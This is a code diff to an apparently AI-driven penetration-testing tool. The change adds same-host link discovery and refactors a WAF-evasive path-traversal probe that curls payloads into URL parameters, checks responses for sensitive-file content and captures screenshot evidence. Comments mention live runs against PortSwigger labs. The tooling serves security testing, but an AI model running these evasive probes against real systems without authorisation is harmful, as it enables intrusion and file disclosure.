@@ -110,6 +110,117 @@ class EvasionService:
 
         return self.runner.run(command, timeout=timeout)
 
+    def _discover_candidate_paths(self, base_url):
+        """Lightweight, single-page link discovery to find candidate
+        endpoints when a bare-root probe finds nothing (see the specs/030
+        comment in `advanced_vuln_probe` for the live-run failure this
+        addresses). Reuses `CrawlerService`'s own curl+grep technique
+        rather than importing it, to avoid a circular import and keep this
+        self-contained - `Advanced_Evasion_Probe` must keep working even
+        if `Crawl_Target` was never called first.
+
+        Args:
+            base_url (str): The root URL to fetch and scan for internal
+                links.
+
+        Returns:
+            list[str]: Up to 3 same-host candidate URLs - links that
+            already carry a query string ranked first (the strongest
+            signal a parameter-driven endpoint exists), plain internal
+            paths otherwise. Empty list if the fetch fails or nothing
+            usable is found.
+        """
+        cmd = (
+            f"curl -s -L --max-time 10 --connect-timeout 5 '{base_url}' | "
+            f"grep -oE 'href=\"[^\"]+\"' | cut -d'\"' -f2 | sort -u"
+        )
+        body = self.stealth_run(cmd, delay=False, timeout=12)
+        links = [
+            l for l in (body or "").split("\n")
+            if l.strip() and not l.startswith(("#", "javascript:", "mailto:"))
+        ]
+        parsed_base = urlsplit(base_url)
+        same_host = []
+        for link in links:
+            if link.startswith("/"):
+                same_host.append(urlunsplit((parsed_base.scheme, parsed_base.netloc, link, "", "")))
+            else:
+                link_parsed = urlsplit(link)
+                if link_parsed.netloc == parsed_base.netloc and link_parsed.scheme in ("http", "https"):
+                    same_host.append(link)
+        with_query = [l for l in same_host if "?" in l]
+        without_query = [l for l in same_host if l not in with_query]
+        seen = set()
+        deduped = []
+        for l in with_query + without_query:
+            if l not in seen:
+                seen.add(l)
+                deduped.append(l)
+        return deduped[:3]
+
+    def _probe_traversal_target(self, base_url, param_candidates, traversal_payloads, clean_target, confirmed_param):
+        """Run every traversal payload against one candidate base URL.
+
+        Factored out of `advanced_vuln_probe` (specs/030) so both the
+        primary probe (against the URL the caller passed in) and the
+        discovery fallback (against endpoints found via
+        `_discover_candidate_paths`, when the primary probe against a bare
+        root found nothing) share identical hit-detection, memory-write,
+        and screenshot-capture logic instead of two copies drifting apart.
+
+        Args:
+            base_url (str): Clean base URL (no query string) to probe.
+            param_candidates (list[str]): Parameter names to try, in
+                order, when `confirmed_param` is not yet locked.
+            traversal_payloads (list[str]): Payloads to try, in order.
+            clean_target (str): Normalized domain for
+                `memory.add_finding()`.
+            confirmed_param (str or None): Already-locked parameter name
+                from a prior call, if any - carried across candidate
+                targets so a param confirmed on one target is reused, not
+                re-fuzzed, on the next.
+
+        Returns:
+            tuple[list[str], list[dict], str or None]: `(result lines,
+            screenshot evidence dicts, the possibly-newly-locked
+            confirmed_param)`.
+        """
+        results = []
+        screenshot_evidence = []
+        for p in traversal_payloads:
+            for param_name in ([confirmed_param] if confirmed_param else param_candidates):
+                probe_url = f"{base_url}?{param_name}={p}"
+                cmd = f"curl -s --max-time 15 --connect-timeout 5 '{probe_url}'"
+                body = self.stealth_run(cmd)
+                hit = False
+                for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
+                    if indicator in body:
+                        confirmed_param = param_name
+                        results.append(f"[!] Path Traversal Success ({p}): {summary}")
+                        self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"Traversal: {p}", summary)
+                        # specs/029: capture proof-of-concept evidence for this
+                        # confirmed hit. Best-effort only - a screenshot failure
+                        # (browser crash, Playwright not installed, etc.) must
+                        # never take down an already-confirmed, already-recorded
+                        # finding, so any exception here is caught and logged,
+                        # never re-raised.
+                        if self.browser_manager is not None:
+                            try:
+                                evidence = self.browser_manager.capture_vulnerability(
+                                    "path_traversal", probe_url, payload=p, note=summary,
+                                )
+                                screenshot_evidence.append(evidence)
+                                results.append(f"    [camera] Screenshot saved: {evidence['screenshot_path']}")
+                            except Exception as e:
+                                print(f"[!] [Argus-Core] Screenshot capture failed for payload '{p}': {e}")
+                                logger.warning("Screenshot capture failed for payload %s: %s", p, e)
+                                results.append(f"    [!] Screenshot capture FAILED ({p}): {e}")
+                        hit = True
+                        break
+                if hit:
+                    break
+        return results, screenshot_evidence, confirmed_param
+
     def advanced_vuln_probe(self, url):
         """Performs targeted, WAF-evasive probes for SQLi and Path Traversal.
 
@@ -194,46 +305,36 @@ class EvasionService:
             p for p in fetch_intruder_payloads(self.runner, "path_traversal")
             if p not in traversal_payloads
         ]
-        for p in traversal_payloads:
-            for param_name in ([confirmed_param] if confirmed_param else param_candidates):
-                probe_url = f"{base_url}?{param_name}={p}"
-                cmd = f"curl -s --max-time 15 --connect-timeout 5 '{probe_url}'"
-                body = self.stealth_run(cmd)
-                hit = False
-                for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
-                    if indicator in body:
-                        confirmed_param = param_name
-                        results.append(f"[!] Path Traversal Success ({p}): {summary}")
-                        self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"Traversal: {p}", summary)
-                        # specs/029: capture proof-of-concept evidence for this
-                        # confirmed hit. Best-effort only - a screenshot failure
-                        # (browser crash, Playwright not installed, etc.) must
-                        # never take down an already-confirmed, already-recorded
-                        # finding, so any exception here is caught and logged,
-                        # never re-raised.
-                        if self.browser_manager is not None:
-                            try:
-                                evidence = self.browser_manager.capture_vulnerability(
-                                    "path_traversal", probe_url, payload=p, note=summary,
-                                )
-                                screenshot_evidence.append(evidence)
-                                results.append(f"    [camera] Screenshot saved: {evidence['screenshot_path']}")
-                            except Exception as e:
-                                # Surfaced in BOTH the returned text (so it's
-                                # visible wherever this tool's output is shown -
-                                # GUI report tab, CLI stdout, agent trace) and the
-                                # logger (structured logs) - a silent
-                                # logger.warning() alone was easy to miss
-                                # entirely depending on the caller's logging
-                                # config, which made a broken Playwright install
-                                # look identical to "no report because nothing
-                                # was actually vulnerable."
-                                print(f"[!] [Argus-Core] Screenshot capture failed for payload '{p}': {e}")
-                                logger.warning("Screenshot capture failed for payload %s: %s", p, e)
-                                results.append(f"    [!] Screenshot capture FAILED ({p}): {e}")
-                        hit = True
-                        break
-                if hit:
+        results_here, evidence_here, confirmed_param = self._probe_traversal_target(
+            base_url, param_candidates, traversal_payloads, clean_target, confirmed_param
+        )
+        results.extend(results_here)
+        screenshot_evidence.extend(evidence_here)
+
+        # specs/030: a bare-root probe (no existing query string, nothing
+        # found above) never learns where the real vulnerable endpoint
+        # actually is - PortSwigger's own path-traversal labs put it on a
+        # specific page (e.g. "/image?filename=..."), not on "/" itself.
+        # Observed live 2026-08-01 (runs b84499b0, 5f71e301, and others):
+        # Advanced_Evasion_Probe ran multiple times against the bare root,
+        # found nothing every time, and the model never called
+        # Crawl_Target first - the "no vulnerabilities detected" result
+        # was a false negative caused by testing the wrong path, not
+        # evidence the target was actually clean. Fall back to a
+        # lightweight, same-page link discovery and retry against up to 3
+        # promising same-host endpoints before giving up.
+        if not results and not existing_params:
+            for discovered_url in self._discover_candidate_paths(base_url):
+                d_parsed = urlsplit(discovered_url)
+                d_existing = parse_qsl(d_parsed.query, keep_blank_values=True)
+                d_base = urlunsplit((d_parsed.scheme, d_parsed.netloc, d_parsed.path, "", ""))
+                d_candidates = [d_existing[-1][0]] if d_existing else param_candidates
+                results_n, evidence_n, confirmed_param = self._probe_traversal_target(
+                    d_base, d_candidates, traversal_payloads, clean_target, confirmed_param
+                )
+                results.extend(results_n)
+                screenshot_evidence.extend(evidence_n)
+                if results_n:
                     break
 
         # 2. SQLi WAF Evasion
